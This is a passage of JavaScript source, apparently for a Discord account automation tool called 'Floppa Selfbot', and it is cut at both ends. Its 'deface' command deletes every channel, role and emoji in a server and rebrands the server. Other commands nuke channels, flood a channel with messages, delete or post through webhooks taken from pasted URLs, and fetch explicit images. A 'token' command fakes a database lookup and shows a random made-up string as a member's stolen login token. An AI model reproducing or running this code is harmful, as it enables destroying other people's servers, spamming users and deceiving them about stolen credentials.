            message.channel.send(`:red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::black_large_square::white_large_square::black_large_square::black_large_square::black_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::black_large_square::white_large_square::black_large_square::white_large_square::white_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::black_large_square::black_large_square::black_large_square::black_large_square::black_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::white_large_square::white_large_square::black_large_square::white_large_square::black_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::black_large_square::black_large_square::black_large_square::white_large_square::black_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::white_large_square::red_square::red_square::red_square:
:red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square::red_square:`)
                .then(console.log(infoSucces))
        }


        //---------------------------------//
        /************  gayrate    **********/
        //---------------------------------//
        if (message.content.startsWith(prefix + "gayrate")) {
            message.delete()
            const gay = Math.random() * 100;
            const gayIndex = Math.floor(gay / 10);
            if (gay == 100) gayText = "Gay confirmed"
            if (gay <= 100) gayText = "Wtf you're so gay :flushed:"
            if (gay <= 70) gayText = "Gay soon"
            if (gay <= 50) gayText = "Ok you're a litle bit gay."
            if (gay <= 10) gayText = "Ok you're not gay."
            if (gay == 0) gayText = "You're not gay wtf how 0% ??"



            const sEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("#da3dcc")
                .setDescription(`:rainbow_flag:  <@${bot.user.id}> is ${Math.floor(gay)}%\n\n${gayText} gay.`);

            if (!args[0]) {
                message.channel.send(sEmbed).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                }).then(console.log(infoSucces));
                return;
            }
            const embed = new Discord.RichEmbed()
                .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("#da3dcc")
                .setDescription(`:rainbow_flag:  ${args[0]} is ${Math.floor(gay)}%\n\n${gayText} gay.`);

            message.channel.send(embed).catch(err => {
                console.log(errorExec)
            }).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces))
        }


        //---------------------------------//
        /************  deface     **********/
        //---------------------------------//

        //TODO Fix error
        if (message.content.startsWith(`${prefix}deface`)) {
            message.delete();
            /* if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(error + "Missing permission: ADMINSTRATOR!")
             } else {*/
            message.guild.channels.forEach(channel => channel.delete().catch(console.log(error + "Invalid Channel")).then(
                console.log(info + "Channel: " + channel.name + " is being deleted successfully")
            ))
            message.guild.roles.forEach((role) => {
                role.delete("Nuking").catch(err => console.log(error + "Invalid Role")).then(console.log(info + "Role: " + role.name + " is being deleted successfully"))
            })
            message.guild.emojis.forEach(e => {
                e.delete({
                    reason: "Nuking"
                }).catch(error + "Invalid Emoji").then(console.log(info + "Emoji: " + e.name + " is being deleted successfully"));
            })

            message.guild.setName(`${sname} v${floppaversion}`).catch(error + "Cant change server name").then(console.log(info + "Server name changed to: " + sname + " v" + floppaversion))

            message.guild.setIcon('https://i.imgur.com/Hcylg0h.png')

            message.guild.createChannel(`${sname} v${floppaversion}`, {
                type: "text"
            }).catch(error + "Cant create channel")


            /*}*/
        }

        //---------------------------------//
        /************  nuke     ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}nuke`)) {
            message.delete();


            let missingPermEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('#2ECC71')
                .setDescription("You do not have sufficient permissions to be able to use this command.")


            let nukedEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("#2ECC71")
                .setDescription("Channel nuked :sunglasses:")
                .setImage("https://i.gifer.com/6Ip.gif")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();


            if (!message.member.hasPermission("MANAGE_CHANNELS")) return message.channel.send(missingPermEmbed).then((msg) => msg.delete(5000));
            pos = message.channel.position
            message.channel.clone().then(channel => {
                channel.setPosition(pos)
                channel.send(nukedEmbed).catch((err) => {
                    console.error(errorExec)
                }).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(10000)
                    }
                })
            })

            message.channel.delete().then(console.log(infoSucces));
        }

        //---------------------------------//
        /************  prune     ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}prune`)) {
            let pruneInvalid = new Discord.RichEmbed()
                .setColor("RED")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Invalid command usage, try using it like: \n``;prune [number]``\n\nArguments: \n``number:`` Number of message you want to delete.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            let pruneEmbed = new Discord.RichEmbed()
                .setColor("#2ECC71")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`${args[0]} messages have been deleted successfully.`)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();



            if (!args[0]) {
                message.delete()
                message.channel.send(pruneInvalid).catch(console.log(errorExec)).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(5000)
                    }
                })
                return
            }
            if (isNaN(args[0])) {
                message.delete()
                message.channel.send(pruneInvalid).catch(console.log(errorExec)).then(msg => {
                    if (config.autodel === true) {
                        msg.delete(5000)
                    }
                    return;
                })
            }

            amount = Math.min(args[0], 100);

            const messages = await message.channel.fetchMessages({
                limit: 100
            });
            const promises = [];

            for (const m of messages.values()) {
                if (promises.length > amount) break;
                if (m.author.id !== bot.user.id) continue;
                promises.push(m.delete());
            }

            return Promise.all(promises).then(message.channel.send(pruneEmbed).then(m => m.delete(5000))).then(console.log(infoSucces));
        }

        //---------------------------------//
        /************  r34     ************/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}r34`)) {
            message.delete()

            const nsfw = new Discord.RichEmbed()
                .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("RED")
                .setDescription("You need to be in a NSFW channel to execute this command.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
            if (!message.channel.nsfw) {
                message.channel.send(nsfw).catch(console.log(errorExec)).then((msg) => msg.delete(5000));
                return
            };

            const arguments = args[0] ? args[0] : ''
            const url = 'https://rule34.xxx/index.php?page=dapi&s=post&q=index&tags=' + arguments;
            try {
                const response = await fetch(url)
                apiData = await response.text()
                parseString(apiData, function (error, result) {
                    let postCount = result.posts.$.count - 1;
                    if (postCount > 100) {
                        postCount = 100;
                    }
                    if (postCount > 0) {
                        var picNum = Math.floor(Math.random() * postCount) + 0;
                        var r34Pic = result.posts.post[picNum].$.file_url;
                        const r34Embed = new Discord.RichEmbed()
                            .setAuthor("Floppa Selfbot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                            .setColor('#2ECC71')
                            .setImage(r34Pic)
                            .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                        message.channel.send(r34Embed).then(msg => {
                            if (config.autodel === true) {
                                msg.delete(10000)
                            }
                        }).then(console.log(infoSucces));
                    } else {
                        console.log(errorExec)
                    }
                })
            } catch (err) {
                console.log(err)
                message.channel.send("There was error with rule34.xxx")
            }
        }

        //---------------------------------//
        /**********  serverinfo ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}serverinfo`)) {
            message.delete();


            let serverEmbed = new Discord.RichEmbed()
                .setColor("#2ECC71")
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setThumbnail(message.guild.iconURL)
                .addField('Server name:', `${message.guild.name}`)
                .addField('Server owner:', message.guild.owner)
                .addField('Member count:', message.guild.memberCount)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            message.channel.send(serverEmbed).catch(err => {
                console.log(errorExec)
            }).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /**********     spam    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}spam`)) {
            message.delete();


            let spamInvalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("red")
                .setDescription("Invalid command usage, try using it like: \n``;spam [number] (message)``\n\nArguments: \n``number:`` Number of time you want to send message\n``message:`` Message you want to send.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            p = 0
            number = args[0]
            messages = args.slice(1).join(" ")


            if (!args[0]) {
                return message.channel.send(spamInvalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                })
            } else {
                if (isNaN(args[0])) {
                    return message.channel.send(spamInvalid).catch(err => {
                        console.log(errorExec)
                    }).then(msg => {
                        msg.delete(5000)
                    })
                }
                if (!args[1]) {
                    return message.channel.send(spamInvalid).catch(err => {
                        console.log(errorExec)
                    }).then(msg => {
                        msg.delete(5000)
                    })
                } else {
                    for (let i = 0; i < number; i++) {

                        message.channel.send(messages).catch(err => {
                            console.log(errorExec)
                        })


                    }
                    console.log(infoSucces);

                }
            }
        }

        //---------------------------------//
        /**********     token    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}token`)) {
            var tokenlist = ["NTg4NDYkTOH5CEguDgY7ZQei.DNZTGp.f8XUzTA3rJ8EumUF2jQEsWAKIdM", "NTg4NDYzWII4BFmjSrD5UFnp.ADXWWs.o2JJyGJ7jI7SbhPZ6bJLlYLILzG", "NTg4NDYbKTX4LQmpXbP6JTke.EOKZQq.a9ZFhHR9tP1HgyAU1yEGhJGRSrW", "NTg4NDYdHQA2EZxtJiK8AIrd.XURZGt.i1CKiMS2aE5ZhhJC2tPLyLFTZtU", "NTg4NDYgCVR6NLkiUdJ4YVes.CMBWJz.h8YUsIF1qR8ZnlXI9eMLmTMESoJ", "NTg4NDYpLOC3SMqxLoI5VFbq.DIBYMb.n4JEmIA4iH0GiqOE7gGEzCPQOlP", "NTg4NDYuXEJ4HRcaRbL6HDjt.ZEGDGu.g1FXeMQ9tO2JspXR9mQSoDTRDhL", "NTg4NDYnWHI5VQbmObQ0QSwx.ZGIJNo.w3ODnTZ9gU9DutOG8cBYtYVVSnJ", "NTg4NDYzZAO8MOgqHzF9YBio.UPKYOh.e5GZiPP0jA4LqnRD9aINaUFBRtB", "NTg4NDYsAPT4RJzkEsO1YTjl.TJAWAf.u6KIrTV6xW8NdvBU6dUKyDSQCxK", "NTg4NDYvUUV8UDewZlE7DPdt.GUDSUc.k2IPmFP1xY1HciPR4hYVgZMXZiL", "NTg4NDYpMZR9DFmmOhO1BSal.IXAHXi.u7QNpAH2kD4HrnQP9dSLrFGOSyR", "NTg4NDYiTCY5IFwmRmK8NWne.VWULTh.d1VMnPH8zO9QctRZ0nLXjBNCSiG", "NTg4NDYmIZZ8TCzjKwX7NFey.HUTCQn.w3WXwTZ9uU4AxpKZ7aITwXQWKjM", "NTg4NDYeSOJ9YZqnZoK8QZbj.KEVXNl.g2BUfTI1bB7CszNT5wETqRFULrR", "NTg4NDYeLLE6DBdnSeP4ZLtj.IFRSCd.a5OLtXH7xF0SdeDA4aNAlLXJXmY", "NTg4NDYoEVO9RZmkVbS0DVxz.GXCSZw.m3THqFV6vD0UzhYP9cJVqIQNLqA", "NTg4NDYkYTA5XDbfIpF2FCre.LUFQYj.o8NYlWJ9aB6QhqRB8cJXeQEXIvI", "NTg4NDYgHDY3YXhgLiP1SIka.GUJRAl.j4CWzWF1mO5GjxSO7rFGbYRGAoG", "NTg4NDYvROS9DKnuMpB4VLok.RODPVs.t1HQdMP7hN3BteWV8aQThKHTVbK", "NTg4NDYwCAA6QLqoKtC4PYuk.OIFGPy.q9HPgBC8gE3XhdPJ0mNOtCCBFlU", "NTg4NDYbBFN5KFlcLrC3FTmv.SNVPKt.s6MCmED6kU1FifEV9kUJtYWOTtA", "NTg4NDYbSYO5PCszWdQ4AGho.WGAGBp.z2GJtVC9wZ5TljWN8mJAhUWNUjR", "NTg4NDYlXQL2HQgaDoV9RDcv.MUHCOy.a8TZdGE2dM6YvjRO7nWHyOXSYmE", "NTg4NDYmYRZ7NOqiWhB7CCky.ZXOUJe.x8GCyOR6wN6MczYH9hFWoBHJDhG", "NTg4NDYtLIK8ORmxUiS9KTdg.UKJLHz.b7OBhPK2kK9HqsFW6zAQrNDQLyJ", "NTg4NDYuWXG6PNdcFaC2PEct.NSFGFt.j5YVyAC3pG1VfnVB1qLOrJYGGaJ", "NTg4NDYcQTQ5QBenVsX7WTwm.AZMIFk.t1SVaVD7yL8ZfuCV5dVWpOKKMfL", "NTg4NDYkIKT1ESsqSfE8BDcy.ESGNWb.g9FKsCY5yA0OlnEK4bJQlNGFOwH", "NTg4NDYnVBU3KAhoGiZ2DKpb.KZTJFi.w1HUpYM6xK5YalSX9vQZgDEXGnG", "NTg4NDYkTLP1CUgvSuN8NZht.CNBZFd.p0WTzMF0lD6FokOP1yRMjCJVOnC", "NTg4NDYiKJI9IGrkYpR5THdm.HMSYOo.c5FBgAS1kB6AhiBX8vXWbGFFHhW", "NTg4NDYyOSD3ZDstLuU0OLjx.JIPYRj.v0HKnJA3wY9BqaYJ6hPMqIXNCpR", "NTg4NDYrCMM7YPnrGoJ4YEsb.EJFIXq.a8OElMC0aF8CnfKL2oSJwUTAWlR", "NTg4NDYeVKB8RJluVcB3NKpr.DSVQOe.k8RKaNR6zT1IcoWD2bJHkKSOYdZ", "NTg4NDYsGMV9QOcbZxR4WSrp.XRGGJw.h6VWeLA0eK3AdvWK2hDTyWRPVfP", "NTg4NDYpZOQ0QJdlIlX7KMzq.GASPOe.d8MQgDE1zM0XpsEB1qMOzBFBJaV", "NTg4NDYnKHF4EQjvKyG0TWkb.IRNCNs.i4ITuHH0wB3DakDM0fFQcCRWGoN", "NTg4NDYeXFJ9VAqbJyW9UYde.IVNFPz.a4OAhXT3nQ0KhwZG8oGOwMOULfK", "NTg4NDYaZFU2IKgoFbU4TChr.TVUWFx.b1NNsKK7jP9YpeQG6hYUxLQQWuN", "NTg4NDYtIXD9CFjnDdN6RVjk.RLFYNx.z1AVwAP9gG4NxtMR7eMDbOUESaA", "NTg4NDYrECQ8AOzyCnU4KFtr.UARHLm.d6QSiXV2lT2QvkJV1sEMvBAQNqI", "NTg4NDYlJWI7XGcfAtU8BDne.TXBNBb.m0HDhPT2qH4KkgFI4hBZwMGBCxH", "NTg4NDYwZGF1UHoaSdZ6XDqa.JMIRVi.w9IHySU2zN2LafWO8rHNlXMQBkZ", "NTg4NDYhSRB7VUrxGuA6NMmz.TANQRd.n8KZeAU5dN3QuqOA9xRPtARKPmC", "NTg4NDYcGXP9JPqoNuP9GDrz.RIBNRh.v6WDjCH0zW2IviLA2tVIfDBPKwY", "NTg4NDYqCDB9YEkmMlM7UKgj.XKWQOs.y2RIpED5sT6BxzGQ7lIGjTKSGyB", "NTg4NDYrYWP3FBusRuD5UEnv.FWGEUb.v9MGrON1tV4IeaXM4yPUyTRZFeO", "NTg4NDYrLDJ1AMqqOqA5TUsg.XJMLRy.z3JQdYB2hZ8OyvVW7mYFvFAHAlC", "NTg4NDYqWVI7NHuoZuC3MCcr.WQLPWi.v9QMfWB0bB7HppWD1xZIqFVHJlE", "NTg4NDYnGAZ4QAbjRvC7PCsq.HPTXTq.m3QLqQG0xA2HbmYP0oEJiEPGXgD", "NTg4NDYcYVJ8KXmhYsC3SLhy.RFXAXz.u2JIwPY3vA2PjwLI0yAPrRPELaL", "NTg4NDYrIKL6PHgcZkF6UZek.XVXILi.y4WKqSD2tA2SgiQO5tNIaHUEPbI", "NTg4NDYvZHE9RWeqItW5ERto.YMQAKd.t7LXvNC9fR8GhsMB5zCWuICAEsM", "NTg4NDYsASH6TFkdVqY9IRuv.MSKXVt.b4PMePJ5nK7ByoZZ8uEEoVEQEgD", "NTg4NDYxJQR2XVswWiY2FHtc.LWPAOe.i8NJnIZ4qI2FsmEQ7lLSiQYSPlW", "NTg4NDYrMYZ3SEjsIlR0WNty.WNBXLh.u4YFbKK6rF7GspRV4cPRjYTYEeM", "NTg4NDYwXYS1TNppNgK3QXbw.RGGEYq.n5PEnRF3jF7NrzFA6hZJqRENCvX", "NTg4NDYdBNQ9JUlxCcE6JCwb.DNGMUb.e9CNfWD7oJ3DcyYI5xJHwLHQVmY", "NTg4NDYoKHB2SRnoQgO1TIdh.REOAPj.z2ZStBE0sF1RllRH9iOVsBCJTdV", "NTg4NDYxGDH8DKvkXkG9MLin.QTFDCh.o9ZHcHQ7iC2ZcqKW4aZMeNJUUaS", "NTg4NDYrVJG7OXtoLaL2PJxo.KNACRu.u0ROjPE7wQ7DssWE1tLVkMEDKvZ", "NTg4NDYqRAP5WPinNmV9KHeh.GSFGXf.e5YBzXJ9oH4RluUL2gSYlCCYGjJ", "NTg4NDYoJQH2TWduVyJ8CGmz.BDBFRz.i0ISpKD7kF6YdnOP0wZWvTYSZcU", "NTg4NDYjYVN8GPpiEfN5XJwn.UMDJSe.j5ZChNK3mH6DyuUW1cTRlBKXGbG", "NTg4NDYmCLH9BPwdMoD1SWyo.KCSFYp.e4VAvFN4aJ3BiyDK5gVMgTDJCwD", "NTg4NDYgVHP5NIbrPaO4OSyg.OIXSPc.n6ZCcJB8vJ3CpqAQ1dVCvHXGMvY", "NTg4NDYhLBZ3OVjoOzT2JJnm.XMVHRf.b8KOhAM9gF7ZfaRF9jKDcWQADwW", "NTg4NDYwBEK1URjxMbT3OHgw.OTIXEa.r5QHiCW1zB6SglIH8oXHgDGMWaL", "NTg4NDYrUGR5JQzuAqK2OWkq.XAURCx.i4DGoKP1aH9GkqYA8vPRgJFLZdD", "NTg4NDYjRSA5DUwzKjT5BWgu.JJIKKz.t4YElNO7wU6PhcOK2sJSrJRZNlP", "NTg4NDYtMNE1IOglFpE8ZFru.ZBCGRm.d7LZgOT1vP5FibUL2gDKiAUMDmD", "NTg4NDYpJKO9XWudXqN9ZOlu.YPAYOj.o5UOyHM8uH1MtsLT9mJTvZFCApL", "NTg4NDYuOWG4ILafXlR2TZyx.NDTHJx.n4CWiPS9xS4NwrAE5xIDwVORLnV", "NTg4NDYnCMJ2UYlvFwF6WZct.YLWNAw.v0MPeBC4gB5WmgDZ0mYOvNYNWnP", "NTg4NDYxWBQ7UBzlKyF7IOkb.HRLVIp.x1OGjRF3jF4QeoIY8tSTiQVVCqE", "NTg4NDYtBIL8OLgvMfJ7ERsn.WCQJMv.d9BBhEW0oS2OlhTQ8yREyCSVRqO", "NTg4NDYaMHD5DCvqWcD7GRoz.TKBTSr.g3PCfUC8gC1SocLW9dIPxSCJOgS", "NTg4NDYsIQY1RUqwUgD0QDoa.VWHIFc.g8TJaMC2yC8FknFJ7tKXfDUYDzN", "NTg4NDYiOHO0TBudVuL7RFlz.FXYCZo.g7TDbSB3xA8NglQB0hYIhFSGPbK", "NTg4NDYrCSR8LKxvRdU8YJnr.EQWPMi.l1TNyKY1kE8AhpUO2xQYcGHVWuR", "NTg4NDYdEMZ6PIxoUeU9DRmd.DIQHVy.s3KUaXB1nS2YfbRV5zSSpWNBYrQ", "NTg4NDYuMUS7FIpiChO6CXzx.DSSGBk.a3PEgAO3qQ0IwnNS6dSGyIDJCsV", "NTg4NDYgDJS1GZndPmD7HJuf.NXTNOc.p0WSdIL8eO4KeqQK4gZDmVBQNpL", "NTg4NDYcSEC8KNzeZuD8BDxt.XCQOPp.z4AQvMA1cR1EtcMV1sQPkVCHIvG", "NTg4NDYdKWL2JMykDsK2EUfd.CATZYe.z2YWdHC7sY0JmmYH9pDPuVCAYzX", "NTg4NDYpCGC9MFzfOyE3BIyq.KLRVYx.p7UMqHN4jG5LrcYH6tPMwGGFFvZ", "NTg4NDYwVGE9FSvbHaD0IUgz.MCRCIr.d0PXtTJ5gB0EqcFI4bILqIEMAlT", "NTg4NDYjHAQ4OBluHxX7UXgv.DENSHa.w1IPwVQ4xF1DapYU5bQXsRDOPfN", "NTg4NDYbXJG7UEulHlG3YMrf.HCFHHl.o0GAvLX1zY8FwlQN3mEYbWEUImF", "NTg4NDYnYEZ4AHiiMrH7FLwh.XBMOGi.h6GOkGT7tX4YugPD1gKBgBJJCoI", "NTg4NDYiFDT1MVqiBkR6WEfv.IYTYTl.r6WIiGU5lG9WskXT4xEYcLCYVeL", "NTg4NDYvRZV6VDehNhX8XXpd.QZYRNa.q2KEeWF1qM6GzoCM0mEIsMBEQbL", "NTg4NDYhOIZ8XLudUqN3NZdx.MGQZLm.a4PRgWG1aQ8KrpSA8kPTfTOVOzJ", "NTg4NDYaFEG7CAteOzS3LMdw.ZQCGWf.j4KOzQI0pA6XczYT0eKVsIAQPgU", "NTg4NDYxXNO4ZItiKyB2ETzv.PQQPYz.o5PLwFL3aF2EslHH5lRBsHHOLcS", "NTg4NDYhBVY6WAmtIcY2HIzo.YLNHRv.c0NRzMQ0eR1YctEO1mXViSXCToE", "NTg4NDYkLNU7VWwsOpM4HIgc.KHKUBq.x3NTdGT5fM1YgrKE1uDCvZSTKuC", "NTg4NDYeHPP8MGfjYfR9OLmw.SHTDUa.b2BVgRT4hL6ElyLD8nHZjVAEBwA", "NTg4NDYuNQS2TIroNxW6EZwj.XPBPJb.g0GYjAW2fS0RqgML7aPGjPJMDdC"]
            message.delete()


            let tokenInvalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor("RED")
                .setDescription("Invalid command usage, try using it like: \n``;token [member] ``\n\nArguments: \n``member:`` Member whose token you want to have.")
                .setFooter(message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            if (!message.mentions.users.first()) {
                message.channel.send(tokenInvalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => msg.delete(5000))
                return;
            } else {
                member = message.mentions.users.first()
            }


            let token1 = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription("Connecting to discord database...")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp()
                .setColor("#2ECC71")

            let token2 = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`Looking for ${member}'s token in the database...`)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp()
                .setColor("#2ECC71")

            let token3 = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setTitle("HIT !")
                .setDescription(`${member}'s token : \`${tokenlist[Math.floor(Math.random()*tokenlist.length)]}\``)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp()
                .setColor("#2ECC71")



            message.channel.send(token1).catch(err => {
                    console.log(errorExec)
                })
                .then(msg => {
                    setTimeout(function () {
                        msg.edit(token2).catch(err => {
                            console.log(errorExec)
                        })
                    }, 5000);
                    setTimeout(function () {
                        msg.edit(token3).catch(err => {
                            console.log(errorExec)
                        }).then(msg => {
                            if (config.autodel === true) {
                                msg.delete(10000)
                            }
                        }).then(console.log(infoSucces));
                    }, 15000)
                })
        }

        //---------------------------------//
        /**********     userinfo    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}userinfo`)) {
            message.delete();


            let user = message.mentions.users.first() || message.author;


            let mentionedInfo = message.guild.member(message.mentions.users.first())
            if (message.mentions.users.first()) {
                member = message.mentions.users.first()
            } else {
                member = message.author
            }
            let UserEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`<@${user.id}>`)
                .setColor(`#2ECC71`)
                .setThumbnail(`${user.displayAvatarURL}`, true)
                .addField('Username:', `${user.username}`, true)
                .addField('Tag:', `#${user.discriminator}`, false)
                .addField('Joined at:', `${moment.utc(user.joinedAt).format('dddd, MMMM Do YYYY, HH:mm:ss')}`, true)
                .addField('Registered at:', `${moment.utc(user.createdAt).format('dddd, MMMM Do YYYY, HH:mm:ss')}`, true)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            let mentionedEmbed = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setDescription(`<@${member.id}>`)
                .setColor(`#2ECC71`)
                .setThumbnail(`${member.displayAvatarURL}`, true)
                .addField('Username:', `${member.username}`, true)
                .addField('Tag:', `#${member.discriminator}`, false)
                .addField('Joined at:', `${moment.utc(member.joinedAt).format('dddd, MMMM Do YYYY, HH:mm:ss')}`, true)
                .addField('Registered at:', `${moment.utc(member.createdAt).format('dddd, MMMM Do YYYY, HH:mm:ss')}`, true)
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            if (!mentionedInfo) message.channel.send(UserEmbed).catch(err => {
                console.log(errorExec)
            }).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
            else message.channel.send(mentionedEmbed).catch(err => {
                console.log(errorExec)
            }).then(msg => {
                if (config.autodel === true) {
                    msg.delete(10000)
                }
            }).then(console.log(infoSucces));
        }

        //---------------------------------//
        /**********     webdelete    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}webdelete`)) {
            message.delete()
            let invalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('RED')
                .setDescription("Invalid command usage, try using it like: \n``;webdelete [webhookURL]``\n\nArguments: \n`webhookURL:` URL of the webhook you want to delete (https://discord.com/api/webhooks/xxxxxxxx/XXXXXXXXXXXXX)")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();

            let rip = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('RED')
                .setDescription(`Webhook deleted by ${"<@" + bot.user.id + ">"} using ${sname} v${floppaversion}`)
                .setTimestamp();

            let succesDelete = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('#2ECC71')
                .setDescription(`Webhook successfully deleted`)
                .setTimestamp();

            webhook = args[0].split("/")
            if (!args[0]) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }

            messages = args.slice(1).join(" ")


            if (!webhook[5] && webhook[6]) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }

            const webhookClient = new Discord.WebhookClient(webhook[5], webhook[6]);


            webhookClient.send('', {
                username: "Floppa Webhook Deleter :)",
                avatarURL: 'https://i.imgur.com/Hcylg0h.png',
                embeds: [rip],

            }).catch(err => {
                console.log(error + "Invalid webhook")
            }).then(() => {
                webhookClient.delete(500).catch(err => {
                    console.log(errorExec)
                }).then(() => {
                    message.channel.send(succesDelete).catch(err => {
                        console.log(errorExec)
                    })
                })
            })

            console.log(infoSucces);
        }

        //---------------------------------//
        /**********     webhook    ***********/
        //---------------------------------//

        if (message.content.startsWith(`${prefix}webhook`)) {
            message.delete()
            let invalid = new Discord.RichEmbed()
                .setAuthor("Floppa SelfBot.", 'https://i.imgur.com/Hcylg0h.png', 'https://discord.gg/NruWrZKV68')
                .setColor('RED')
                .setDescription("Invalid command usage, try using it like: \n``;webhook [webhookURL] (message)``\n\nArguments: \n`webhookURL:` URL of the webhook you want to send a message (https://discord.com/api/webhooks/xxxxxxxx/XXXXXXXXXXXXX)\n``message:`` Message you want to send.")
                .setFooter("Requested by " + message.author.tag, message.author.displayAvatarURL)
                .setTimestamp();


            if (!args[0]) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }
            webhook = args[0].split("/")

            messages = args.slice(1).join(" ")
            if (!messages) messages = "This message was sent thanks to Floppa Selfbot :)"

            if (!webhook[5] && webhook[6]) {
                message.channel.send(invalid).catch(err => {
                    console.log(errorExec)
                }).then(msg => {
                    msg.delete(5000)
                });
                return;
            }

            const webhookClient = new Discord.WebhookClient(webhook[5], webhook[6]);

            const embed = new Discord.RichEmbed()
                .setTitle(messages)
                .setColor('#42fc43');


            webhookClient.send('', {
                username: "Floppa Selfbot :)",
                avatarURL: 'https://i.imgur.com/Hcylg0h.png',
